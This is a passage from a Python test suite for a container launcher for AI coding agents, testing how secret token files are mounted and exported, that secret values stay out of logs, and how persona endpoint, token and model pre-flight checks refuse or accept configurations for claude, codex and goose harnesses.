            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(missing)})
        assert (mounts, exports) == ([], [])  # fail-soft
        assert any("not found" in r.getMessage() for r in caplog.records)
        assert any("ANTHROPIC_AUTH_TOKEN" in r.getMessage() for r in caplog.records)

    def test_present_file_no_warning(self, tmp_path, caplog):
        # Mutation-check: a PRESENT file must NOT emit the not-found warning.
        import logging
        tok = tmp_path / "token"
        tok.write_text("v\n")
        with caplog.at_level(logging.WARNING):
            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
        assert exports == ["ANTHROPIC_AUTH_TOKEN"]
        assert not any("not found" in r.getMessage() for r in caplog.records)

    def test_empty_file_var_dropped_warns(self, tmp_path, caplog):
        import logging
        tok = tmp_path / "token"
        tok.write_text("")  # empty (st_size == 0) — stat-detected, never read
        with caplog.at_level(logging.WARNING):
            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
        assert (mounts, exports) == ([], [])
        assert any("empty" in r.getMessage() for r in caplog.records)

    def test_directory_pointer_dropped(self, tmp_path, caplog):
        import logging
        d = tmp_path / "adir"
        d.mkdir()
        with caplog.at_level(logging.WARNING):
            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(d)})
        assert (mounts, exports) == ([], [])
        assert any("not a regular file" in r.getMessage() for r in caplog.records)

    def test_unreadable_file_var_dropped_no_crash(self, tmp_path, caplog):
        import logging
        import os
        tok = tmp_path / "token"
        tok.write_text("sk-secret\n")
        os.chmod(tok, 0o000)
        try:
            with caplog.at_level(logging.WARNING):
                mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
        finally:
            os.chmod(tok, 0o600)
        if os.geteuid() != 0:
            assert (mounts, exports) == ([], [])
            assert any("unreadable" in r.getMessage() for r in caplog.records)

    def test_tilde_expansion(self, tmp_path, monkeypatch):
        home = tmp_path / "home"
        (home / ".config").mkdir(parents=True)
        (home / ".config" / "token").write_text("tok-tilde\n")
        monkeypatch.setenv("HOME", str(home))
        mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": "~/.config/token"})
        assert exports == ["ANTHROPIC_AUTH_TOKEN"]
        assert str(mounts[0].source) == str(home / ".config" / "token")

    def test_env_var_expansion(self, tmp_path, monkeypatch):
        d = tmp_path / "secrets"
        d.mkdir()
        (d / "token").write_text("tok-envvar\n")
        monkeypatch.setenv("SECRETS_DIR", str(d))
        mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": "$SECRETS_DIR/token"})
        assert str(mounts[0].source) == str(d / "token")

    def test_secret_value_never_read_or_logged(self, tmp_path, caplog):
        # LOAD-BEARING (arm's-length): the value must not appear in any log record,
        # AND the mount carries only the PATH (never the contents).
        import logging
        secret = "sk-super-secret-do-not-log-XYZ"
        tok = tmp_path / "token"
        tok.write_text(secret + "\n")
        with caplog.at_level(logging.DEBUG):
            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
        assert str(mounts[0].source) == str(tok)  # PATH only
        for r in caplog.records:
            assert secret not in r.getMessage()

    def test_per_var_isolation_missing_does_not_block_present(self, tmp_path):
        good = tmp_path / "good"
        good.write_text("good-tok\n")
        mounts, exports = self._call({
            "GOOD": str(good),
            "MISSING": str(tmp_path / "absent"),
        })
        assert exports == ["GOOD"]
        assert len(mounts) == 1


class TestSecretExportShim:
    """The box-side export shim (``_secret_export_shim``) — arm's-length wiring."""

    def test_shim_wraps_agent_with_exec(self):
        from kanibako.commands.start import _secret_export_shim
        from kanibako.settings.settings_categories import SECRET_MOUNT_DIR
        ep, args = _secret_export_shim("claude", ["--flag"], ["ANTHROPIC_AUTH_TOKEN"])
        assert ep == "sh"
        assert args[0] == "-c"
        script = args[1]
        # exports from the MOUNT path, never a literal secret; then exec the agent.
        assert f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN" in script
        assert "export ANTHROPIC_AUTH_TOKEN=" in script
        assert 'exec "$@"' in script
        # $0=sh, $@=claude --flag (exec runs the agent with its args intact).
        assert args[2:] == ["sh", "claude", "--flag"]

    def test_multiple_vars_each_exported(self):
        from kanibako.commands.start import _secret_export_shim
        _ep, args = _secret_export_shim("claude", [], ["A_TOK", "B_TOK"])
        script = args[1]
        assert "export A_TOK=" in script and "export B_TOK=" in script


class TestDirectiveFlattenShim:
    """The goose launch-flatten shim (``_directive_flatten_shim``) — increment 2b."""

    def test_shim_flattens_seed_to_final_then_exec(self):
        from kanibako.commands.start import _directive_flatten_shim
        ep, args = _directive_flatten_shim("goose", ["session"])
        assert ep == "sh"
        assert args[0] == "-c"
        script = args[1]
        # Runs the flattener in SOURCE->DEST file mode, silent-safe, then execs the
        # agent with its args intact.  The flattener is MACHINERY, not canon: it
        # arrives via the unconditional ``kani_pkg`` package bind, NOT from the
        # read-only canon tree (C-CANON R1, P-2).
        assert (
            '"/opt/kanibako/kanibako/scripts/import-directives.py"' in script
        )
        assert '"$KANIBAKO_DIRECTIVE_SEED" "$KANIBAKO_DIRECTIVE_FINAL"' in script
        assert "|| true" in script
        assert 'exec "$@"' in script
        # GUARD (2026-07-12): the flatten only runs when a FINAL slot is set, so a
        # no-agent/plain-shell launch (no KANIBAKO_DIRECTIVE_FINAL) skips it cleanly.
        assert 'if [ -n "$KANIBAKO_DIRECTIVE_FINAL" ]' in script
        # $0=sh, $@=goose session (exec runs the agent with its args intact).
        assert args[2:] == ["sh", "goose", "session"]

    def test_shim_no_additional_context_flag(self):
        """goose gets the FILE-write mode, NOT --additional-context (no hook)."""
        from kanibako.commands.start import _directive_flatten_shim
        _ep, args = _directive_flatten_shim("goose", [])
        assert "--additional-context" not in args[1]


# ===========================================================================
# Persona LOAD-OR-ERROR — the safety fix (Jei dogfood 2026-07-03).
# ===========================================================================


class TestPreflightPersonaLoad:
    """Unit tests for ``_preflight_persona_load`` (the load-or-error decision)."""

    def _cfg(self):
        from kanibako.settings.agent_config import AgentConfig
        return AgentConfig()

    def _logger(self):
        return MagicMock()

    def _legacy_host_dir(self, tmp_path, monkeypatch, *, base_url,
                         token="sk-bearer\n"):
        """Lay the RETIRED B3 host dir ``~/.config/claude/<persona>/``.

        Nothing reads it any more (D3).  It is written here only so the tests can
        assert that it is IGNORED — the deletion was authorized on the fact that no
        live persona resolves through it, and a compatibility arm is explicitly not
        wanted.
        """
        import json

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        pdir = tmp_path / "claude" / "navigator"
        pdir.mkdir(parents=True)
        (pdir / "settings.json").write_text(
            json.dumps({"env": {"ANTHROPIC_BASE_URL": base_url}})
        )
        if token is not None:
            (pdir / "token").write_text(token)
        return pdir

    def test_keyspace_endpoint_with_token_no_mutation(self, tmp_path):
        from kanibako.commands.start import _preflight_persona_load

        cfg = self._cfg()
        tok = tmp_path / "tok"
        tok.write_text("sk-key\n")
        cfg.secret_path = {"ANTHROPIC_AUTH_TOKEN": str(tok)}
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘claude", cfg, "https://key.example", self._logger(),
        )
        assert (endpoint, err) == ("https://key.example", None)
        # A claude (ENV-delivery) persona carries NO config-file provider.
        assert provider is None
        # The pre-flight never writes back into the config it was handed.
        assert "endpoint" not in cfg.state

    def test_a_legacy_host_dir_is_IGNORED(self, tmp_path, monkeypatch):
        """⚑ B3 RETIRED (D3): a full legacy host dir buys the persona NOTHING.

        settings.json with a usable ``env.ANTHROPIC_BASE_URL`` AND the sibling
        ``token`` file are both present — the exact shape that used to auto-adopt an
        endpoint, a bearer token and a model-map env.  With no keyspace/store config
        the launch must now REFUSE, and the refusal must not send the user to that
        directory.  (Mutation: restore the adopt branch → RED.)
        """
        from kanibako.commands.start import _preflight_persona_load

        self._legacy_host_dir(tmp_path, monkeypatch, base_url="https://b3.example")
        cfg = self._cfg()
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘claude", cfg, None, self._logger(),
        )
        assert endpoint is None and provider is None
        assert err is not None and "cannot be loaded" in err
        assert "no endpoint is configured" in err
        # Nothing was adopted into the in-memory config.
        assert cfg.state == {} and cfg.secret_path == {} and cfg.env == {}
        # ...and the message names the keyspace route, not the dead directory.
        assert "system set" in err and ".endpoint=" in err
        assert "settings.json" not in err
        assert "class setup" not in err
        assert "/claude/navigator" not in err

    def test_a_legacy_host_token_does_not_satisfy_the_token_gate(
        self, tmp_path, monkeypatch,
    ):
        """The other half of B3: the host-dir ``token`` file was the LAST token
        source (file → store → host dir).  That leg is gone, so a keyspace endpoint
        with no configured key is unloadable even when the legacy token sits there.
        """
        from kanibako.commands.start import _preflight_persona_load

        self._legacy_host_dir(
            tmp_path, monkeypatch, base_url="https://ignored", token="sk-host\n",
        )
        cfg = self._cfg()  # empty secret_path — nothing may supply it now.
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘claude", cfg, "https://key.example", self._logger(),
        )
        assert endpoint is None and provider is None
        assert err is not None and "no usable auth token" in err
        assert cfg.secret_path == {}      # NOT adopted into the config.
        assert "/claude/navigator" not in err

    def test_unrecognised_persona_hard_errors(self, tmp_path, monkeypatch):
        from kanibako.commands.start import _preflight_persona_load

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        cfg = self._cfg()
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘claude", cfg, None, self._logger(),
        )
        assert endpoint is None
        assert err is not None and "cannot be loaded" in err
        assert "navigator+claude" in err  # user-facing '+' form
        # The claude ENV shape names its API-key route too, not just the endpoint.
        assert "ANTHROPIC_AUTH_TOKEN" in err
        assert cfg.state == {}  # nothing written back

    def test_keyspace_endpoint_no_token_anywhere_errors(
        self, tmp_path, monkeypatch,
    ):
        # Keyspace endpoint, NO secret_path token, no store → hard error (a bearer
        # endpoint with no token 401s inside the box).
        from kanibako.commands.start import _preflight_persona_load

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        cfg = self._cfg()
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘claude", cfg, "https://key.example", self._logger(),
        )
        assert endpoint is None
        assert err is not None and "no usable auth token" in err

    def test_token_gate_requires_the_token_var_specifically(
        self, tmp_path, monkeypatch,
    ):
        # N1: some OTHER secret_path var resolving does NOT satisfy the token gate —
        # only a resolvable ANTHROPIC_AUTH_TOKEN counts.
        from kanibako.commands.start import _preflight_persona_load

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))  # no host token.
        other = tmp_path / "other"
        other.write_text("value\n")
        cfg = self._cfg()
        cfg.secret_path = {"SOME_OTHER_VAR": str(other)}
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘claude", cfg, "https://key.example", self._logger(),
        )
        assert endpoint is None
        assert err is not None and "no usable auth token" in err


class TestPersonaWiring:
    """``_persona_wiring`` — the harness-declared persona endpoint/token delivery."""

    def test_no_target_is_claude_default(self):
        # No target (pre-seam / legacy caller) → ENV delivery + ANTHROPIC_AUTH_TOKEN:
        # the LEGACY fallback shape, spelled out explicitly rather than inherited
        # from the field defaults (an ENV harness with an empty token_var would read
        # as the config-file DYNAMIC shape).
        from kanibako.commands.start import _PERSONA_TOKEN_VAR, _persona_wiring
        w = _persona_wiring(None)
        assert w.endpoint_delivery == "env"
        assert w.token_var == _PERSONA_TOKEN_VAR == "ANTHROPIC_AUTH_TOKEN"
        # No model veto: a claude persona that names no model needs none.
        assert w.model_required is False

    def test_claude_target_declares_its_persona_shape(self):
        # The real claude descriptor DECLARES its persona shape (T3.2): ENV delivery
        # + the FIXED ANTHROPIC_AUTH_TOKEN token var, so the resolved wiring does not
        # depend on the ENV-delivery per-field fallback (which now covers only
        # out-of-tree / version-skew plugins).
        from kanibako.commands.start import _PERSONA_TOKEN_VAR, _persona_wiring
        from kanibako.plugins.claude.target import ClaudeTarget
        spec = ClaudeTarget().descriptor.persona
        assert spec is not None
        assert spec.endpoint_delivery == "env"
        assert spec.token_var == _PERSONA_TOKEN_VAR == "ANTHROPIC_AUTH_TOKEN"
        w = _persona_wiring(ClaudeTarget())
        assert w.endpoint_delivery == "env"
        assert w.token_var == _PERSONA_TOKEN_VAR

    def test_claude_wiring_matches_the_legacy_fallback(self):
        """Claude's DECLARED wiring == the no-target fallback, field for field.

        The declaration is the whole point of the flip (declare-your-own-shape), so
        it must not change what claude resolves to.  (Mutation: drop the claude
        `persona:` block's token_var → RED.)
        """
        from kanibako.commands.start import _persona_wiring
        from kanibako.plugins.claude.target import ClaudeTarget
        assert _persona_wiring(ClaudeTarget()) == _persona_wiring(None)

    def test_codex_target_declares_config_file_dynamic_var(self):
        from kanibako.commands.start import _persona_wiring
        from kanibako.plugins.codex.target import CodexTarget
        spec = CodexTarget().descriptor.persona
        assert spec is not None
        assert spec.endpoint_delivery == "config_file"
        assert spec.wire_api == "responses"
        w = _persona_wiring(CodexTarget())
        assert w.endpoint_delivery == "config_file"
        assert w.token_var == ""  # dynamic: the configured secret_path key


class TestPreflightClaudeByteIdentical:
    """CHARACTERIZATION: a claude persona resolves IDENTICALLY with the new
    harness-aware seam — passing the real claude Target must not change the
    resolved endpoint, token var, secret_path, or (absent) provider vs target=None.
    """

    def _cfg(self, tok_path):
        from kanibako.settings.agent_config import AgentConfig
        cfg = AgentConfig()
        cfg.secret_path = {"ANTHROPIC_AUTH_TOKEN": str(tok_path)}
        return cfg

    def test_claude_target_matches_no_target(self, tmp_path):
        from kanibako.commands.start import _preflight_persona_load
        from kanibako.plugins.claude.target import ClaudeTarget

        tok = tmp_path / "tok"
        tok.write_text("sk-key\n")

        res_none = _preflight_persona_load(
            "navigator℘claude", self._cfg(tok), "https://key.example", MagicMock(),
        )
        res_claude = _preflight_persona_load(
            "navigator℘claude", self._cfg(tok), "https://key.example", MagicMock(),
            target=ClaudeTarget(),
        )
        # Endpoint / error / provider all identical, provider None.
        assert res_none == res_claude
        assert res_claude == ("https://key.example", None, None)

    def test_claude_target_matches_no_target_when_UNLOADABLE(self, tmp_path,
                                                             monkeypatch):
        """The same characterization on the REFUSAL, which B3 used to split.

        With no endpoint anywhere, target=None and the real ClaudeTarget must now
        produce the SAME error — the legacy fallback shape and claude's declared
        shape no longer differ in anything the pre-flight branches on.
        """
        from kanibako.settings.agent_config import AgentConfig
        from kanibako.commands.start import _preflight_persona_load
        from kanibako.plugins.claude.target import ClaudeTarget

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        res_none = _preflight_persona_load(
            "navigator℘claude", AgentConfig(), None, MagicMock(),
        )
        res_claude = _preflight_persona_load(
            "navigator℘claude", AgentConfig(), None, MagicMock(),
            target=ClaudeTarget(),
        )
        assert res_none == res_claude
        assert res_claude[0] is None and res_claude[2] is None
        assert res_claude[1] is not None and "cannot be loaded" in res_claude[1]


class TestPreflightCodexPersona:
    """Codex (config-file harness) persona resolution — the config_file gate."""

    def _codex(self):
        from kanibako.plugins.codex.target import CodexTarget
        return CodexTarget()

    def _cfg(self, *, secret=None):
        from kanibako.settings.agent_config import AgentConfig
        cfg = AgentConfig()
        if secret:
            cfg.secret_path = dict(secret)
        return cfg

    def test_keyspace_endpoint_and_key_resolves_provider(self, tmp_path):
        from kanibako.commands.start import _preflight_persona_load
        from kanibako.vscode.vscode_config import CodexModelProvider

        key = tmp_path / "navkey"
        key.write_text("nv-secret\n")
        cfg = self._cfg(secret={"NAVIGATOR_API_KEY": str(key)})
        # model is the CASCADE-resolved value (keyspace_model), NOT cfg.state (INC 3).
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘codex", cfg, "https://api.ai.example/v1", MagicMock(),
            target=self._codex(), keyspace_model="gemma-4-31b-it",
        )
        assert err is None
        assert endpoint == "https://api.ai.example/v1"
        assert provider == CodexModelProvider(
            provider_id="navigator",
            name="navigator",
            base_url="https://api.ai.example/v1",
            wire_api="responses",
            env_key="NAVIGATOR_API_KEY",   # the configured secret_path key.
            model="gemma-4-31b-it",
        )

    def test_empty_model_errors(self, tmp_path):
        # A usable token but NO cascade model → a NaviGator provider needs a model
        # id → hard error (never ship model = "").
        from kanibako.commands.start import _preflight_persona_load
        key = tmp_path / "navkey"
        key.write_text("nv-secret\n")
        cfg = self._cfg(secret={"NAVIGATOR_API_KEY": str(key)})
        for missing in (None, "", "   "):
            endpoint, err, provider = _preflight_persona_load(
                "navigator℘codex", cfg, "https://api.ai.example/v1", MagicMock(),
                target=self._codex(), keyspace_model=missing,
            )
            assert endpoint is None and provider is None
            assert err is not None and "no model configured" in err
            assert "system set" in err and ".model=" in err

    def test_the_model_gate_reads_the_declaration_not_a_hardwired_rule(self, tmp_path,
                                                                       monkeypatch):
        # A missing model is NOT automatically invalid — absence means "this persona
        # needs none" unless the HARNESS vetoes via persona.model_required. Codex
        # vetoes (its config-file delivery cannot express "no model"), so the gate
        # above fires; drop the veto and the SAME input must stop producing that
        # error. Pins that this path reads the descriptor, as the ENV path does,
        # rather than hardwiring the rule. (Mutation: restore the hardwired
        # ``if not model`` and this goes RED.)
        import dataclasses
        import kanibako.commands.start as start_mod
        from kanibako.commands.start import _persona_wiring, _preflight_persona_load

        vetoless = dataclasses.replace(
            _persona_wiring(self._codex()), model_required=False,
        )
        assert vetoless.endpoint_delivery == "config_file"
        monkeypatch.setattr(start_mod, "_persona_wiring", lambda target: vetoless)

        key = tmp_path / "navkey"
        key.write_text("nv-secret\n")
        cfg = self._cfg(secret={"NAVIGATOR_API_KEY": str(key)})
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘codex", cfg, "https://api.ai.example/v1", MagicMock(),
            target=self._codex(), keyspace_model=None,
        )
        # Still refused — but on the DESCRIPTOR, not the missing model: a
        # config-file harness cannot deliver "no model" (an omitted key falls
        # through to codex's own moving default), so it must never ship
        # ``model = ""`` NOR silently omit it.
        assert endpoint is None and provider is None
        assert err is not None
        assert "model_required" in err
        assert "no model configured" not in err

    def test_codex_declares_the_model_veto(self):
        # The declaration the gate above reads. Codex vetoes; without this the
        # gate would let a model-less persona through to the provider block.
        from kanibako.commands.start import _persona_wiring
        assert _persona_wiring(self._codex()).model_required is True

    def test_no_endpoint_config_file_error(self, tmp_path, monkeypatch):
        # No resolved endpoint → hard error pointing at the keyspace route, and —
        # config-file delivery resolving its key downstream — naming no API-key
        # hint (that hint is the ENV shape's).
        from kanibako.commands.start import _preflight_persona_load

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘codex", self._cfg(), None, MagicMock(),
            target=self._codex(),
        )
        assert endpoint is None
        assert provider is None
        assert err is not None and "cannot be loaded" in err
        assert "system set" in err and ".endpoint=" in err
        assert "secret_path" not in err

    def test_endpoint_but_no_token_errors(self):
        # ZERO configured secret keys → the "none was found" sub-case (distinct from
        # the ambiguous / unusable-pointer messages below).
        from kanibako.commands.start import _preflight_persona_load
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘codex", self._cfg(), "https://api.example/v1", MagicMock(),
            target=self._codex(), keyspace_model="m",
        )
        assert endpoint is None and provider is None
        assert err is not None and "no usable auth token" in err
        assert "env_key" in err
        assert "none was found" in err
        assert "ambiguous" not in err and "unusable file" not in err

    def test_ambiguous_multiple_secret_keys_errors(self, tmp_path):
        # >1 configured secret_path key → cannot pick the provider env_key → the
        # DIFFERENTIATED "ambiguous" sub-case (names the count + keys), NOT "none".
        from kanibako.commands.start import _preflight_persona_load
        a = tmp_path / "a"
        a.write_text("x\n")
        b = tmp_path / "b"
        b.write_text("y\n")
        cfg = self._cfg(secret={"KEY_A": str(a), "KEY_B": str(b)})
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘codex", cfg, "https://api.example/v1", MagicMock(),
            target=self._codex(), keyspace_model="m",
        )
        assert endpoint is None and provider is None
        assert err is not None and "no usable auth token" in err
        assert "ambiguous" in err
        assert "2" in err and "KEY_A" in err and "KEY_B" in err
        assert "none was found" not in err

    def test_unusable_token_pointer_errors(self, tmp_path):
        # The single configured key points at a MISSING file → the DIFFERENTIATED
        # "unusable file" sub-case (names the key + path), NOT "none was found".
        from kanibako.commands.start import _preflight_persona_load
        cfg = self._cfg(secret={"NAVIGATOR_API_KEY": str(tmp_path / "absent")})
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘codex", cfg, "https://api.example/v1", MagicMock(),
            target=self._codex(), keyspace_model="m",
        )
        assert endpoint is None and provider is None
        assert err is not None and "no usable auth token" in err
        assert "unusable file" in err
        assert "NAVIGATOR_API_KEY" in err
        assert "none was found" not in err and "ambiguous" not in err

    def test_resolved_endpoint_is_suppress_signal(self, tmp_path):
        # suppress_oauth = active_endpoint is not None; a loadable codex persona
        # returns a non-None endpoint → the caller suppresses the auth.json sync.
        from kanibako.commands.start import _preflight_persona_load
        key = tmp_path / "k"
        key.write_text("z\n")
        cfg = self._cfg(secret={"NAVIGATOR_API_KEY": str(key)})
        endpoint, err, _provider = _preflight_persona_load(
            "navigator℘codex", cfg, "https://api.example/v1", MagicMock(),
            target=self._codex(), keyspace_model="m",
        )
        assert err is None
        assert endpoint is not None  # → suppress_oauth fires (auth.json dropped).


class TestPreflightGoosePersona:
    """Goose (ENV-delivery, KEYSPACE-config) persona resolution — INC G1.

    Goose shares the ENV pre-flight with claude; what differs is DECLARED, not
    branched — the bearer token comes from ``agent.<node>.secret_path.OPENAI_API_KEY``
    (its own ``token_var``), and unlike claude it declares ``model_required``, so a
    model is REQUIRED.
    """

    def _goose(self):
        from kanibako.plugins.goose.target import GooseTarget
        return GooseTarget()

    def _cfg(self, *, secret=None):
        from kanibako.settings.agent_config import AgentConfig
        cfg = AgentConfig()
        if secret:
            cfg.secret_path = dict(secret)
        return cfg

    def test_keyspace_endpoint_key_and_model_resolves(self, tmp_path):
        # Endpoint + OPENAI_API_KEY secret + model → loads; NO provider (env harness),
        # NO adoption/mutation.
        from kanibako.commands.start import _preflight_persona_load
        key = tmp_path / "k"
        key.write_text("sk-openai\n")
        cfg = self._cfg(secret={"OPENAI_API_KEY": str(key)})
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘goose", cfg, "https://oai.example/v1", MagicMock(),
            target=self._goose(), keyspace_model="gemma-4-31b-it",
        )
        assert err is None
        assert endpoint == "https://oai.example/v1"
        assert provider is None  # ENV harness → no config.toml provider.
        assert "endpoint" not in cfg.state  # the pre-flight writes nothing back.

    def test_no_endpoint_goose_worded_error(self, tmp_path, monkeypatch):
        # Unset endpoint → keyspace error naming endpoint + the GOOSE token var's
        # secret_path route (its own declared ``token_var``, not claude's).
        from kanibako.commands.start import _preflight_persona_load

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘goose", self._cfg(), None, MagicMock(), target=self._goose(),
        )
        assert endpoint is None and provider is None
        assert err is not None and "cannot be loaded" in err
        assert "system set" in err and ".endpoint=" in err
        assert "OPENAI_API_KEY" in err  # names the API-key secret_path route.
        assert "ANTHROPIC_AUTH_TOKEN" not in err  # its OWN token var, not claude's.

    def test_endpoint_but_no_token_goose_worded(self, tmp_path):
        # Endpoint set but no OPENAI_API_KEY secret → goose-worded token error naming
        # the secret_path route, under its own declared token var.
        from kanibako.commands.start import _preflight_persona_load
        endpoint, err, provider = _preflight_persona_load(
            "navigator℘goose", self._cfg(), "https://oai.example/v1", MagicMock(),
            target=self._goose(), keyspace_model="m",
        )
        assert endpoint is None and provider is None
        assert err is not None and "no usable auth token" in err
        assert "OPENAI_API_KEY" in err and "secret_path" in err
        assert "ANTHROPIC_AUTH_TOKEN" not in err

    def test_endpoint_but_no_model_gate_fires(self, tmp_path):
        # Endpoint + token but NO model → the goose model-required gate errors
        # (parity with codex); each empty form triggers it.
        from kanibako.commands.start import _preflight_persona_load
        key = tmp_path / "k"
        key.write_text("sk-openai\n")
        for missing in (None, "", "   "):
            cfg = self._cfg(secret={"OPENAI_API_KEY": str(key)})
            endpoint, err, provider = _preflight_persona_load(
                "navigator℘goose", cfg, "https://oai.example/v1", MagicMock(),
                target=self._goose(), keyspace_model=missing,
            )
            assert endpoint is None and provider is None
            assert err is not None and "no model configured" in err
            assert "system set" in err and ".model=" in err

    def test_goose_wiring_declares_pin_and_gates(self):
        from kanibako.commands.start import _persona_wiring
        w = _persona_wiring(self._goose())
        assert w.endpoint_delivery == "env"
        assert w.token_var == "OPENAI_API_KEY"
        assert w.model_required is True
        assert w.provider_pin == (("provider", "openai"),)


class TestGooseProviderAutoPin:
    """The GOOSE_PROVIDER auto-pin: a goose persona endpoint forces provider=openai
    (via the descriptor's provider→GOOSE_PROVIDER env), so it can't be forgotten; a
    bare goose box / claude / codex are byte-identical (empty provider_pin)."""

    def test_pin_forces_goose_provider_env(self):
        # effective_state pinned provider=openai → assemble_env emits GOOSE_PROVIDER.
        from kanibako.plugins.goose.target import GooseTarget
        from kanibako.targets import assembly
        desc = GooseTarget().descriptor
        # Simulate the launch-site pin (active_endpoint set → provider forced openai).
        state = {"endpoint": "https://oai.example/v1", "provider": "openai"}
        env = assembly.assemble_env(desc, access="full", setting_values=state)
        assert env["GOOSE_PROVIDER"] == "openai"
        assert env["OPENAI_HOST"] == "https://oai.example/v1"

    def test_claude_and_codex_declare_no_pin(self):
        from kanibako.commands.start import _persona_wiring
        from kanibako.plugins.claude.target import ClaudeTarget
        from kanibako.plugins.codex.target import CodexTarget
        assert _persona_wiring(ClaudeTarget()).provider_pin == ()
        assert _persona_wiring(CodexTarget()).provider_pin == ()


class TestCodexPersonaLaunchWiring:
    """INC 3 launch-site: ``_run_container`` threads the preflight-resolved codex
    provider into the UNCONDITIONAL ``Target.deliver_directive_hook`` seam call
    (T1.2 — no name-gate in core), and passes ``None`` for claude / bare codex
    (byte-identical write).  The sibling ``Target.deliver_panel_permissions``
    seam (T1.1) is pinned here too: same call site, same unconditional contract.

    Reached on EVERY launch (first-launch-after-create, start, reattach — all funnel
    through this one call site), so this proves the create/start/reattach coverage.
    The box materialisation is mocked exactly as the other ``start_mocks`` launch
    tests do (``m.target`` records the seam calls); the delivered-file content is
    proven at the emitter/Target level in ``test_code_config.py`` + the golden.
    """

    def _provider(self):
        from kanibako.vscode.vscode_config import CodexModelProvider
        return CodexModelProvider(
            provider_id="navigator", name="navigator",
            base_url="https://api.example/v1", wire_api="chat",
            env_key="NAVIGATOR_API_KEY", model="gemma-4-31b-it",
        )

    def test_codex_persona_launch_threads_resolved_provider(self, start_mocks):
        from kanibako.plugins.codex.target import CodexTarget
        prov = self._provider()
        with start_mocks() as m:
            # resolve_agent yields the CANONICAL node (℘), the persona identity.
            m.resolve_agent.return_value = _sel("navigator℘codex")
            m.target.name = "codex"
            m.target.descriptor = CodexTarget().descriptor
            with patch(
                "kanibako.commands.start._preflight_persona_load",
                return_value=("https://api.example/v1", None, prov),
            ):
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[], explicit_agent="navigator+codex",
                )
            assert rc == 0
            m.target.deliver_directive_hook.assert_called_once()
            kwargs = m.target.deliver_directive_hook.call_args.kwargs
            # config_root is THE box home as seen from the host — identity, not
            # a bare called-once (R5: a typo'd kwarg must not silently pass).
            assert kwargs["config_root"] is m.proj.shell_path
            assert kwargs["access"] == "full"
            # the SAME provider the preflight resolved reaches the seam.
            assert kwargs["model_provider"] is prov
            # the sibling panel seam fires unconditionally at the same site.
            m.target.deliver_panel_permissions.assert_called_once_with(
                config_root=m.proj.shell_path, access="full",
            )

    def test_bare_codex_launch_passes_no_provider(self, start_mocks):
        from kanibako.plugins.codex.target import CodexTarget
        with start_mocks() as m:
            m.resolve_agent.return_value = _sel("codex")
            m.target.name = "codex"
            m.target.descriptor = CodexTarget().descriptor
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            # bare (non-persona) codex → no provider → byte-identical write.
            m.target.deliver_directive_hook.assert_called_once_with(
                config_root=m.proj.shell_path,
                access="full",
                model_provider=None,
            )
            m.target.deliver_panel_permissions.assert_called_once_with(
                config_root=m.proj.shell_path, access="full",
            )

    def test_claude_launch_passes_no_provider(self, start_mocks):
        # default start_mocks target is claude; a non-persona claude launch never
        # resolves a provider → the seam gets model_provider=None (byte-identical).
        with start_mocks() as m:
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.target.deliver_directive_hook.assert_called_once_with(
                config_root=m.proj.shell_path,
                access="full",
                model_provider=None,
            )
            m.target.deliver_panel_permissions.assert_called_once_with(
                config_root=m.proj.shell_path, access="full",
            )


class TestPersonaCreateVerdict:
    """`persona_create_verdict` — the `box create` guard (runs BEFORE the journal)."""

    def _target(self, name="claude"):
        from kanibako.settings.agent_config import AgentConfig
        t = MagicMock()
        t.name = name
        t.generate_agent_config.return_value = AgentConfig()
        return t

    def _ctx(self, tmp_path, agent):
        proj = MagicMock()
        proj.project_path = tmp_path
        return MagicMock(), MagicMock(), proj  # std, config, proj

    def test_unloadable_explicit_persona_returns_error(self, tmp_path, monkeypatch):
        from kanibako.commands.start import persona_create_verdict

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))  # no host dir
        std, config, proj = self._ctx(tmp_path, "navigator+claude")
        with (
            patch("kanibako.commands.start.load_merged_config"),
            patch("kanibako.settings.config.resolve_agent", return_value="navigator℘claude"),
            patch(
                "kanibako.commands.start.resolve_target",
                return_value=self._target(),
            ),
            patch(
                "kanibako.commands.start.agent_settings_path",
                return_value=tmp_path / "absent" / "settings.yaml",
            ),
            patch(
                "kanibako.commands.start._resolve_box_launch_decisions",
                return_value=(_SHARED_AUTH, None, None),
            ),
        ):
            err = persona_create_verdict(
